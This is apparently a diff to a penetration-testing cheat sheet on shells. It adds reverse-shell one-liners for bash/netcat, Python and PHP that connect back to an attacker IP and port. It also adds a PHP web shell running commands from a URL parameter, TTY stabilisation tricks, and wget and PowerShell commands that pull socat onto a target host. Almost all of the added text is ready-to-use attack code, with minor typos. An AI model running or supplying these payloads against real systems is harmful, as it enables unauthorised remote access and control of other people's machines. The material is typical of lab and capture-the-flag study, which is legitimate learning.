@@ -1,5 +1,67 @@
 # Shells
 
+## Introduction
+
+# Shell Stablisation Methods
+
+
+Netcat shell stablisation
+```bash
+//python trick
+//python2|3 remember!
+python -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterml
+CTRL+Z
+stty raw -echo; fg
+```
+OR
+```bash
+//rlwrap trick
+sudo apt install rlwrap
+rlwrap nc -lvnp <port>
+```
+OR
+
+//stepto-socat trick
+```bash
+sudo python3 -m http.server 80
+wget <local-ip>/socat -0 /tmp/socat
+````
+!!IF WINDOWS
+```powershell
+Invoke-WebRequest -uri <local-ip>/socat.exe -outfile C:\\Windows\temp\socat.exe
+```
+
+# Shells
+
+## Linux Shells
+
+bash nc -e workaround
+```bash
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f
+```
+
+python
+
+```python
+python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("ip", port)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);`
+
+'import os; os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f")'
+```
+php
+```php
+file "<?php system($_GET['cmd']);?>"
+"<?php exec("/bin/bash -c 'bash -i > /dev/tcp/ip/port 0>&1'");?>"
+```
+
+## Windows 
+
+[windows php](https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php)
+
+
+# Shells 101
+
 A shell is command line or grapical user interface of a system, the outermost layer to interact with it.
 
 Quick useful list of linux networking commands help
